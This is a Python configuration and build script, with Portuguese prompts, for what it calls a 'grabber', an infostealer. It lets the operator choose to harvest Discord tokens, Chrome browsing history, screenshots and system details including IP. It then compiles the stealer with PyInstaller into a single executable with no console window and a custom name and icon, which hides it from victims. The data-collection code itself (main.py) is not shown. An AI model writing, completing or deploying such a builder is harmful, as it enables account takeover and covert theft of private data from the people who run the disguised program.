import json
import os
import PyInstaller.__main__

def get_yes_no_input(prompt):
    """Obter entrada sim/não do usuário."""
    while True:
        response = input(prompt + " (s/n): ").lower()
        if response in ["s", "n"]:
            return response == "s"
        print("Por favor, digite 's' para sim ou 'n' para não.")

def configure():
    """Configurar o grabber interativamente."""
    print("Configurando o Grabber...")
    settings = {}
    
    # Configurar quais dados coletar
    print("\nQuais dados você deseja coletar?")
    settings["collect_system_info"] = get_yes_no_input("Coletar informações do sistema (usuário, IP, SO, etc.)?")
    settings["collect_discord_token"] = get_yes_no_input("Coletar tokens do Discord?")
    settings["collect_browser_history"] = get_yes_no_input("Coletar histórico do navegador (Chrome)?")
    settings["collect_screenshot"] = get_yes_no_input("Coletar captura de tela?")
    
    # Configurar captura de tela
    if settings["collect_screenshot"]:
        settings["save_screenshot_locally"] = get_yes_no_input("Salvar captura de tela localmente como output/screenshot.png? (Se não, será enviada via memória)")
    else:
        settings["save_screenshot_locally"] = False
    
    # Configurar executável
    print("\nConfigurando o executável...")
    settings["executable_name"] = input("Digite o nome do executável (sem .exe, padrão: meu_grabber): ") or "meu_grabber"
    
    # Solicitar caminho do ícone com validação
    while True:
        icon_path = input("Digite o caminho do ícone (.ico, ex.: icons/custom_icon.ico, deixe vazio para nenhum): ") or ""
        if not icon_path:
            settings["icon_path"] = ""
            break
        # Verificar se é um arquivo .ico
        if os.path.isdir(icon_path):
            print(f"Erro: '{icon_path}' é uma pasta. Por favor, forneça o caminho de um arquivo .ico (ex.: icons/custom_icon.ico).")
        elif not os.path.isfile(icon_path):
            print(f"Erro: Arquivo '{icon_path}' não encontrado. Verifique o caminho ou deixe vazio para não usar ícone.")
        elif not icon_path.lower().endswith('.ico'):
            print(f"Erro: O arquivo '{icon_path}' não é um arquivo .ico. Por favor, forneça um arquivo com extensão .ico.")
        else:
            settings["icon_path"] = icon_path
            break
    
    # Salvar configurações
    os.makedirs("config", exist_ok=True)
    settings_path = os.path.join("config", "settings.json")
    with open(settings_path, "w") as f:
        json.dump(settings, f, indent=2)
    print(f"Configurações salvas em {settings_path}")
    
    # Criar executável
    if get_yes_no_input("Deseja criar o executável agora?"):
        build_executable(settings)

def build_executable(settings):
    """Gerar o executável com PyInstaller."""
    executable_name = settings.get("executable_name", "meu_grabber")
    icon_path = settings.get("icon_path", "")
    
    print(f"Gerando executável '{executable_name}'...")
    
    # Preparar argumentos do PyInstaller
    pyinstaller_args = [
        "main.py",
        f"--name={executable_name}",
        "--onefile",
        "--noconsole",  # Sem console (remova se quiser logs)
        "--clean",
        f"--add-data={os.path.join('config', '')}{';' if os.name == 'nt' else ':'}config"
    ]
    
    # Adicionar ícone, se configurado
    if icon_path:
        pyinstaller_args.append(f"--icon={icon_path}")
    
    try:
        # Executar PyInstaller
        PyInstaller.__main__.run(pyinstaller_args)
        print(f"Executável gerado em: dist/{executable_name}{'.exe' if os.name == 'nt' else ''}")
    except Exception as e:
        print(f"Erro ao gerar executável: {e}")
        print("Tente verificar o caminho do ícone e reexecutar configure.py.")

if __name__ == "__main__":
    configure()